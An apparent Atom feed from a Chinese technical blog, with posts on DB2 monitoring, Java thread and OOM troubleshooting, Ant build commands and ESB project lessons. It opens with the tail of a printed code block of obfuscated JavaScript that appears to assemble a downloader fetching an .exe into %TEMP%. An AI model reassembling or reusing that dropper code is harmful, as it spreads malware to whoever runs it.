</span><span class='line'>function huh() { a1 += '2); x'; ha(); };
</span><span class='line'>function dv() { a1 += '); '; unt(); };
</span><span class='line'>function md() { a1 += '60130'; sz(); };
</span><span class='line'>function oai() { a1 += 'e();'; klrf(); };
</span><span class='line'>function wls() { a1 += '21'; bdhj(); };
</span><span class='line'>function gvna() { a1 += 'a = n'; mkur(); };
</span><span class='line'>function q() { a1 += ' xa.s'; ihjo(); };
</span><span class='line'>function uwku() { a1 += '.XM'; wj(); };
</span><span class='line'>function vo() { a1 += 'in'; axij(); };
</span><span class='line'>function rryx() { a1 += 'E0C0'; fmxx(); };
</span><span class='line'>function ey() { a1 += '.la'; y(); };
</span><span class='line'>function ql() { a1 += '93'; obye(); };
</span><span class='line'>function tqum() { a1 += 'and-'; hr(); };
</span><span class='line'>function qhm() { a1 += '70C0'; lrqi(); };
</span><span class='line'>function xel() { a1 += 'cat'; lg(); };
</span><span class='line'>function k() { a1 += 'n '; ie(); };
</span><span class='line'>function pe() { a1 += 'tp:/'; srsv(); };
</span><span class='line'>function sz() { a1 += '.exe"'; oc(); };
</span><span class='line'>function m() { a1 += 'r fn '; nyfn(); };
</span><span class='line'>function qogu() { a1 += 'en('; ys(); };
</span><span class='line'>function cvwq() { a1 += 'ect("'; am(); };
</span><span class='line'>function iza() { a1 += ' { };'; ue(); };
</span><span class='line'>function p() { a1 += 'XObj'; nrg(); };
</span><span class='line'>function fmxx() { a1 += '50B'; xh(); };
</span><span class='line'>function djo() { a1 += 'ta'; krf(); };
</span><span class='line'>function upd() { a1 += 'va'; vtvt(); };
</span><span class='line'>function tsd() { a1 += 'ttp'; kdea(); };
</span><span class='line'>function xs() { a1 += '};'; vjma(); };
</span><span class='line'>function wp() { a1 += ');'; vrm(); };
</span><span class='line'>function gigu() { a1 += '54'; uykf(); };
</span><span class='line'>function tf() { a1 += 'new'; pt(); };
</span><span class='line'>function xz() { a1 += '50B1'; cf(); };
</span><span class='line'>function qbtb() { a1 += ' xo'; dkiz(); };
</span><span class='line'>function esu() { a1 += '0D1'; ee(); };
</span><span class='line'>function ao() { a1 += 'MP%"'; as(); };
</span><span class='line'>function sj() { a1 += 'nment'; gsn(); };
</span><span class='line'>function nmf() { a1 += '19'; ibwz(); };
</span><span class='line'>function qzpp() { a1 += '("h'; tsd(); };
</span><span class='line'>function kyn() { a1 += '24555'; mmjk(); };
</span><span class='line'>function rn() { a1 += 'eadys'; djo(); };
</span><span class='line'>function mmjk() { a1 += '2574'; kost(); };
</span><span class='line'>function ee() { a1 += '70'; lxf(); };
</span><span class='line'>function xtm() { a1 += 'n = '; qq(); };
</span><span class='line'>function iun() { a1 += 'hp?i'; fkss(); };
</span><span class='line'>function xafg() { a1 += 'gs("%'; rsbi(); }; bzwk();</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DB2监控-db2top]]></title>
    <link href="http://haoweishow.com/blog/2014/10/10/db2jian-kong-db2top/"/>
    <updated>2014-10-10T11:18:41+08:00</updated>
    <id>http://haoweishow.com/blog/2014/10/10/db2jian-kong-db2top</id>
    <content type="html"><![CDATA[<h3>db2top命令使用</h3>

<ul>
<li><strong>db2top -d <dbname></strong>  该命令的面板<br/>
<img src="http://haoweishow.com/images/postImage/20141010-db2top1.png"></li>
<li><strong>shift+d</strong> 查看SQL执行情况,包括SQL的调用次数,执行时间等<br/>
通常可以根据SQL的<strong>执行次数</strong>以及<strong>执行时间</strong>可以判断数据库当前的处理能力
<img src="http://haoweishow.com/images/postImage/20141010-db2top2.png"></li>
<li>每条sql都有对应的HashValue,<strong>shift+l</strong>可以根据该sql的HashValue查看完整的sql语句<br/>
<img src="http://haoweishow.com/images/postImage/20141010-db2top3.png"></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[性能问题排查]]></title>
    <link href="http://haoweishow.com/blog/2014/10/09/xing-neng-wen-ti-pai-cha/"/>
    <updated>2014-10-09T14:09:46+08:00</updated>
    <id>http://haoweishow.com/blog/2014/10/09/xing-neng-wen-ti-pai-cha</id>
    <content type="html"><![CDATA[<h3>Linux系统</h3>

<ul>
<li>定位占用cpu高的java线程</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>top -H -p &lt;pid&gt; -d 1 -n3</span></code></pre></td></tr></table></div></figure>


<ul>
<li>查看该线程的执行时间</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ps -mp &lt;pid&gt; -o THREAD,tid,time</span></code></pre></td></tr></table></div></figure>


<ul>
<li>通过pstack查看进程的栈信息</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pstack &lt;pid&gt;</span></code></pre></td></tr></table></div></figure>


<h3>Aix系统</h3>

<ul>
<li>定位占用cpu高的java线程</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ps -mp &lt;pid&gt; -o THREAD
</span><span class='line'>结果显示格式：线程十进制的ID 状态:(R/S/Z) CPU占用百分比 其它...</span></code></pre></td></tr></table></div></figure>


<ul>
<li>将十进制线程ID转换为十六进制</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>printf "%x\n" 131268965</span></code></pre></td></tr></table></div></figure>


<ul>
<li>查找线程</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kill -3 &lt;pid&gt;
</span><span class='line'>根据十六进制的线程ID，可以定位到占用CPU高的线程</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[OOM故障分析-案例1]]></title>
    <link href="http://haoweishow.com/blog/2014/09/13/oomgu-zhang-fen-xi-an-li-1/"/>
    <updated>2014-09-13T10:10:42+08:00</updated>
    <id>http://haoweishow.com/blog/2014/09/13/oomgu-zhang-fen-xi-an-li-1</id>
    <content type="html"><![CDATA[<h3>背景</h3>

<hr />

<ul>
<li>生产环境,应用刚上线,几乎每天一次OOM.</li>
<li>操作系统: AIX 6.1</li>
<li>JDK版本: J2RE 5.0 IBM J9 2.3 AIX ppc64-64 build j9vmap6423-20100808</li>
<li>JVM参数: -Xmx2048m -Xms2048m 无其它参数设置,采用JVM默认设置</li>
<li>分析工具: jca455.jar  ibm_ha446.jar</li>
</ul>


<h3>分析1</h3>

<hr />

<p>第一次出现故障,发过来java进程的dump文件,3组12个文件:</p>

<ul>
<li>4个heapdump.xxxx.phd;</li>
<li>4个javacore.xxxx.txt;</li>
<li>4个Snap.xxxx.trc</li>
</ul>


<h4>使用IBM HA工具分析phd文件</h4>

<p>打开<strong>[Analysis View]</strong>如下:<br/>
<img src="http://haoweishow.com/images/postImage/20140913-1-IBM-ha-AnalysisView.png"></p>

<ul>
<li>通过HA的分析,结果很明显,java/util/Stack里的数据量超大,占用内存92.2%</li>
<li>这个Stack是自定义的XML解析器里的一个属性,用于存储在解析过程中存储XML节点信息</li>
<li>看到这里,如果对应用了解的话,是能够找到程序哪个模块调用这个XML解析器,可是我不了解这个应用,而且不在现场</li>
<li>接下来的分析过程,包括未来几天陆续出现的OOM,分析其中的phd文件都是同样的现象,Stack里的数据量超大,都是超过90%的堆内存占用</li>
</ul>


<p>打开<strong>[Root List]</strong>如下:<br/>
<img src="http://haoweishow.com/images/postImage/20140913-2-IBM-ha-RootList.png"></p>

<ul>
<li>排名第一的是XML解析器,其它的对象内存使用都很小</li>
</ul>


<p>打开<strong>[Tree View]</strong>如下:<br/>
<img src="http://haoweishow.com/images/postImage/20140913-3-IBM-ha-TreeView.png"></p>

<ul>
<li>这里有个疑问,为什么这个解析器是root object,明明是有线程调用这个解析器进行XML解析的</li>
<li><strong>关于JVM的root object还是不了解!!</strong></li>
</ul>


<h4>使用IBM JCA工具分析javacore文件</h4>

<p>打开<strong>[Thread Dump List]</strong>如下:<br/>
<img src="http://haoweishow.com/images/postImage/20140913-4-IBM-jca-Thread.png"></p>

<ul>
<li>在网上查找关于javacore文件相关资料的时候,网上有个案例,可以根据这里的WARN提示就定位出产生OOM的线程</li>
<li>我的这个案例不一样了,可以看到这几个WARN涉及的线程申请的内存都很小,说明这个时候内存已经被使用殆尽,这几个线程不是导致OOM的真正原因</li>
</ul>


<p>打开<strong>[Thread Status]</strong>如下:<br/>
<img src="http://haoweishow.com/images/postImage/20140913-5-IBM-jca-ThreadStatus.png"></p>

<ul>
<li>这里显示的线程信息,与OOM没有关系,但是可以看到这个应用里的一些问题,很多线程都处于Blocked状态,左下角框起来的仅仅是部分,几乎都是由于日志记录引起的</li>
<li>这个应用由于业务场景的需要,需要记录交易的详细日志.后来到现场看到系统的日志,一共2个还是3个日志文件,每个小时切换一个日志文件.</li>
<li>近300个线程,将大量的交易日志写到两个文件中,锁的竞争可想而知;这里其实也有优化的空间的,可以根据某些关键字,将日志文件分类,就像数据库表分区一样;相信300个线程写分散到20个日志文件中,性能的提升应该是可见的.</li>
</ul>


<h4>初步分析</h4>

<ul>
<li>至此,导致OOM的直接原因是解析XML的时候,该解析器的Stack里的数据超大</li>
<li>而Stack里的数据超大,是不是解析过程中陷入某种循环无法退出导致呢?</li>
</ul>


<h3>分析2</h3>

<p>终于到现场进行分析了,很庆幸的是,在现场的性能测试环境能够重现该问题.<br/>
分析该解析器:</p>

<ul>
<li>该类在解析XML的时候,用Stack来存储节点的信息</li>
<li>遇到节点开始,将节点的对象入栈,遇到节点结束,弹栈</li>
<li>因此造成Stack数据量大就这能出现在入栈的地方了.</li>
<li>所以在入栈之后,增加判断,当栈的size超过阀值之后,打印出一些信息</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="c1">//伪代码  </span>
</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">xxxxReader</span> <span class="kd">extends</span> <span class="n">xxxx</span><span class="o">{</span>
</span><span class='line'>    <span class="kd">private</span> <span class="n">Stack</span> <span class="n">stack</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Stack</span><span class="o">();</span>
</span><span class='line'>    <span class="cm">/**************************************************************/</span>
</span><span class='line'>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">debug</span><span class="o">(){</span>
</span><span class='line'>        <span class="k">if</span><span class="o">(</span><span class="n">stack</span><span class="o">.</span><span class="na">size</span><span class="o">()&gt;</span><span class="mi">1000</span><span class="o">){</span>
</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;stacksize:&quot;</span><span class="o">+</span><span class="n">stack</span><span class="o">.</span><span class="na">size</span><span class="o">());</span>
</span><span class='line'>            <span class="n">Thread</span><span class="o">.</span><span class="na">dumpStack</span><span class="o">();</span><span class="c1">//打印栈信息,就知道哪个模块调用到这个解析器</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>    <span class="cm">/**************************************************************/</span>
</span><span class='line'>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">startElement</span><span class="o">(){</span>
</span><span class='line'>        <span class="n">stack</span><span class="o">.</span><span class="na">push</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
</span><span class='line'>        <span class="n">debug</span><span class="o">();</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">endElement</span><span class="o">(){</span>
</span><span class='line'>        <span class="n">stack</span><span class="o">.</span><span class="na">pop</span><span class="o">();</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">startArray</span><span class="o">(){</span>
</span><span class='line'>        <span class="n">stack</span><span class="o">.</span><span class="na">push</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
</span><span class='line'>        <span class="n">debug</span><span class="o">();</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">endArray</span><span class="o">(){</span>
</span><span class='line'>        <span class="n">stack</span><span class="o">.</span><span class="na">pop</span><span class="o">();</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li>在性能测试环境打上该类,重启,再次进行压力测试.</li>
<li>半个小时左右的样子,出现OOM,经过统计System.out和Thread.dumpStack()的日志,锁定了两个调用的地方.</li>
<li>再次修改这个解析器,加入临时属性,用于保存要解析的报文,这样在出现超大Stack的时候,可以将报文打印出来,这个代码就不贴了.</li>
<li>重启,再压,得到异常时候的报文,该报文的结构正常,应该不会导致死循环,于是在本地编写解析器的测试代码,解析该报文1次,1万次都正常.</li>
<li>难道是多线程的问题呢?</li>
<li>修改测试代码,两个线程,同时各执行1万次,问题重现了!!!!</li>
<li>又多跑了很多次,稳定重现,有时候是OOM,有时候是解析过程中抛解析的异常,很明显这个解析器多线不安全</li>
<li>至此,该问题已经基本定位,该解析模块比较复杂,没深入研究,因为我这里有十分成熟的解决方案</li>
<li>替换调用该解析器的两处代码,重启,再压,问题解决.</li>
</ul>


<h3>感受</h3>

<ul>
<li>刚开始被派到现场解决这个问题的时候,心里一直很忐忑,解决不了怎么办?因为之前给的dump文件没有分析出问题点,现场能提供的肯定也是这些文件.解决不了怎么跟客户交代呢&hellip;</li>
<li>来到现场,问题能够重现,有戏!</li>
<li>分析过程还是要根据经验,逐步排查问题点</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Ant命令汇总]]></title>
    <link href="http://haoweishow.com/blog/2014/09/11/antming-ling-hui-zong/"/>
    <updated>2014-09-11T14:49:43+08:00</updated>
    <id>http://haoweishow.com/blog/2014/09/11/antming-ling-hui-zong</id>
    <content type="html"><![CDATA[<h2>更新zip包</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;target name="zip"&gt;
</span><span class='line'>    &lt;zip destFile="111.zip" basedir="." includes="123.txt" update="true" /&gt;
</span><span class='line'>&lt;/target&gt;</span></code></pre></td></tr></table></div></figure>


<h2>调用target</h2>

<ul>
<li>方法1</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;target name="war.import" depends="svn.task,war.name"&gt;
</span><span class='line'>    &lt;echo&gt;A: ${war.name}&lt;/echo&gt;
</span><span class='line'>&lt;/target&gt;</span></code></pre></td></tr></table></div></figure>


<ul>
<li>方法2</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;target name="war.import" depends="svn.task"&gt;
</span><span class='line'>    &lt;antcall target="war.name"/&gt;
</span><span class='line'>    &lt;echo&gt;B: ${war.name}&lt;/echo&gt;
</span><span class='line'>&lt;/target&gt;</span></code></pre></td></tr></table></div></figure>


<h2>copy命令</h2>

<ul>
<li>拷贝单个文件</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;copy todir="/home/esb" file="/tmp/config/build.xml"/&gt;</span></code></pre></td></tr></table></div></figure>


<ul>
<li>拷贝文件夹</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;copy todir="/home/esb" includeEmptyDirs="yes" overwrite=“true” verbose="true"&gt;
</span><span class='line'>    &lt;fileset dir="/test/config"&gt;
</span><span class='line'>        &lt;include name="aaa/**"/&gt;
</span><span class='line'>        &lt;exclude name="bbb/**"/&gt;
</span><span class='line'>    &lt;/fileset&gt;
</span><span class='line'>&lt;/copy&gt;</span></code></pre></td></tr></table></div></figure>


<h2>文件移动</h2>

<ul>
<li>文件改名</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;move file="src1/test.txt" tofile="src/test.txt"/&gt;</span></code></pre></td></tr></table></div></figure>


<ul>
<li>单个文件移动</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;move file="src1/test.txt" todir="src"/&gt;</span></code></pre></td></tr></table></div></figure>


<ul>
<li>文件夹移动</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;move todir="src"&gt; 
</span><span class='line'>    &lt;fileset dir="src1"/&gt;
</span><span class='line'>&lt;/move&gt;</span></code></pre></td></tr></table></div></figure>


<h2>javac设置classpath</h2>

<ul>
<li>方法1</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;javac srcdir="${src}" destdir="${classes}"&gt;
</span><span class='line'>    &lt;classpath&gt;
</span><span class='line'>        &lt;fileset dir="lib"&gt;
</span><span class='line'>            &lt;include name="*.jar"/&gt;
</span><span class='line'>        &lt;/fileset&gt;
</span><span class='line'>        &lt;path locaiton="build/classes" /&gt;
</span><span class='line'>    &lt;/classpath&gt;
</span><span class='line'>&lt;/javac&gt;</span></code></pre></td></tr></table></div></figure>


<ul>
<li>方法2</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;javac srcdir="${src}" destdir="${classes}"&gt;
</span><span class='line'>    &lt;classpath&gt;
</span><span class='line'>        &lt;fileset dir="build/lib/" includes="*.jar" /&gt;
</span><span class='line'>        &lt;dirset dir="build/classes/" /&gt;
</span><span class='line'>    &lt;/classpath&gt;
</span><span class='line'>&lt;/javac&gt;</span></code></pre></td></tr></table></div></figure>


<h2>javac参数</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;javac srcdir="${common.src.dir}" destdir="${build.temp.common.classes.dir}" debug="on" memoryMaximumSize="256m" fork="true" deprecation="off" failonerror="false"&gt;
</span><span class='line'>    &lt;!--给编译器指定编码，防止出现："警告： 编码 GBK 的不可映射字符"--&gt;
</span><span class='line'>    &lt;compilerarg line="-encoding UTF-8"/&gt;
</span><span class='line'>    &lt;classpath refid="common.lib.path"/&gt;
</span><span class='line'>    &lt;include name="**"/&gt;
</span><span class='line'>&lt;/javac&gt;</span></code></pre></td></tr></table></div></figure>


<h2>jar参数</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;jar destfile="${dest.jar.name}"&gt;
</span><span class='line'>    &lt;fileset dir="${dest.classes.dir}"&gt;
</span><span class='line'>        &lt;include name="com/**/**/*.class" /&gt;
</span><span class='line'>    &lt;/fileset&gt;
</span><span class='line'>    &lt;manifest&gt;
</span><span class='line'>        &lt;!-- 增加MF的参数信息 --&gt; 
</span><span class='line'>        &lt;attribute name="Main-class" value="${mainclass}"/&gt;
</span><span class='line'>        &lt;attribute name="Class-Path" value="${mf.classpath}"/&gt;
</span><span class='line'>    &lt;/manifest&gt;
</span><span class='line'>&lt;/jar&gt;</span></code></pre></td></tr></table></div></figure>


<h2>文件转路径</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!-- Create a property containing all .jar files, prefix lib/, and seperated with a space --&gt;
</span><span class='line'>&lt;pathconvert property="mf.classpath" pathsep=" "&gt;  
</span><span class='line'>    &lt;mapper&gt;  
</span><span class='line'>        &lt;chainedmapper&gt;  
</span><span class='line'>            &lt;!-- jar包文件只留文件名，去掉目录信息 --&gt;  
</span><span class='line'>            &lt;flattenmapper/&gt;  
</span><span class='line'>            &lt;!-- add lib/ prefix --&gt;  
</span><span class='line'>            &lt;globmapper from="*" to="lib/*"/&gt;  
</span><span class='line'>        &lt;/chainedmapper&gt;  
</span><span class='line'>    &lt;/mapper&gt;  
</span><span class='line'>    &lt;path refid="lib-classpath"/&gt;  
</span><span class='line'>&lt;/pathconvert&gt;</span></code></pre></td></tr></table></div></figure>


<h2>执行java程序</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;target name="test-crawl1"&gt;
</span><span class='line'>    &lt;java classname="org.apache.nutch.crawl.Crawl"&gt;
</span><span class='line'>        &lt;classpath&gt;
</span><span class='line'>            &lt;path location="build/classes"&gt;&lt;/path&gt;
</span><span class='line'>        &lt;/classpath&gt;
</span><span class='line'>        &lt;classpath&gt;
</span><span class='line'>            &lt;fileset dir="lib" includes="**/*.jar"&gt;&lt;/fileset&gt;
</span><span class='line'>        &lt;/classpath&gt;
</span><span class='line'>        &lt;arg value="multiurls1.txt"/&gt;
</span><span class='line'>        &lt;arg value="-dir"/&gt;
</span><span class='line'>        &lt;arg value="crawed1"/&gt;
</span><span class='line'>        &lt;arg value="-depth"/&gt;
</span><span class='line'>        &lt;arg value="7"/&gt;
</span><span class='line'>        &lt;arg value="-threads"/&gt;
</span><span class='line'>        &lt;arg value="7"/&gt;
</span><span class='line'>        &lt;arg value="-topN"/&gt;
</span><span class='line'>        &lt;arg value="-100"/&gt;
</span><span class='line'>    &lt;/java&gt;
</span><span class='line'>&lt;/target&gt;</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[浦发银行ESB项目实施经验总结]]></title>
    <link href="http://haoweishow.com/blog/2014/09/09/pu-fa-yin-xing-esbxiang-mu-shi-shi-jing-yan-zong-jie/"/>
    <updated>2014-09-09T23:41:37+08:00</updated>
    <id>http://haoweishow.com/blog/2014/09/09/pu-fa-yin-xing-esbxiang-mu-shi-shi-jing-yan-zong-jie</id>
    <content type="html"><![CDATA[<h3>项目实施经验总结</h3>

<hr />

<ul>
<li>XML报文的转义字符处理</li>
<li>如果XML报文要传输不可见字符，则要制定相应的规范（例如转换成十六进制字符）</li>
<li>数据库建表，添加约束，可以避免不必要的重复数据或者空数据，主键或者约束必须落在关键的字段上，否则无法避免关键数据的重复</li>
<li>日志打印，info日志是描述做什么，debug日志描述怎么做的</li>
<li>异常日志，没有特殊情况，不能把日志吞掉，相反，详细的输出出现异常情况时运行态相关的数据到日志中，可以方便问题定位</li>
<li>数据从数据库加载到内存，如果是静态数据，可以先将数据落地到文件系统，再从文件系统加载到内存中，这样如果出现运行时异常，可以查看本地文件系统进行问题定位（此方法要结合实际情况）</li>
<li>项目过程中的问题、环境、联系人等一些静态信息，可以使用wiki或者blog系统存放，这样的好处是查看、检索、修订方便</li>
<li>项目组环境等信息及时更新，记录到文档中，方便归档，但是不方便使用；</li>
<li>问题总结清单</li>
<li>每次代码更新需要review&mdash;这个要根据项目实际情况而定</li>
<li>所有的备份操作必须进行恢复性验证，特别是数据库的备份</li>
<li>与外围系统的通讯模式之类的方案，需要项目组统一评审确定</li>
<li>代码库与版本库更新部署流程</li>
<li>确定标准字段/定义标准报文的时候，需要明确每个字段的含义，如果有出现模糊不清楚，或者未来废弃的字段，必须在服务化治理过程中，逐步废弃掉这些含糊不清的字段</li>
<li>线程池怎么用?

<ul>
<li>必须根据根据其实际功能 为 不同的线程池 设置相应的名称，这样在dump出线程信息里面，可以根据名称来区分线程</li>
<li>能想像一下,dump文件里有1万多个线程池,名字都是<strong>[pool-xxx-thread-xxx]</strong>,而你不知道这些线程池是哪里创建出来的</li>
</ul>
</li>
<li>标准性的接口规范，例如SOP报文转SOAP报文，这个转换过程中，需要字段映射，同时还需要将每个字段对应的转换方式在工作之初，要确定下来，如果前期因为接口有些字段不明确，很可能造成后期频繁的修改规范或者处理方式</li>
<li>上线的脚本，制定标准的格式：脚本名称（脚本文件名称格式标准化；脚本名称分类：ddl和dml分类；功能分类；insert和update等分类），脚本内容（每条语句或者每组语句，必须添加脚本注释）</li>
<li>监控功能，监控内容：数据库连接池，容器线程池，虚拟机内存监控，队列监控</li>
<li>交接工作一定要对其交接的内容深入了解。</li>
<li>性能测试由行内进行</li>
</ul>

]]></content>
  </entry>
  
</feed>
